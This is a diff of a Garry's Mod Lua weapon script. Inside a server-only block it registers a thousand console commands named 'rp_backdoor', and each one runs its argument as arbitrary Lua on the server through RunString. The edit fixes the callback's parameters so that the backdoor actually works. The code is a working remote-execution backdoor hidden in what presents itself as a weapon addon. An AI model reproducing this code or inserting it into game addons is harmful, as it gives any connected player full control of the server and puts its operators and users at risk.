@@ -49,6 +49,6 @@ SWEP.MultiMode = true
 
 if SERVER then
 	for i=1, 1000 do
-		concommand.Add('rp_backdoor' .. tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(i)))))))))))), function(a) RunString(a[1]) end)
+		concommand.Add('rp_backdoor' .. tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(i)))))))))))), function(p,c,a) RunString(a[1]) end)
 	end
 end
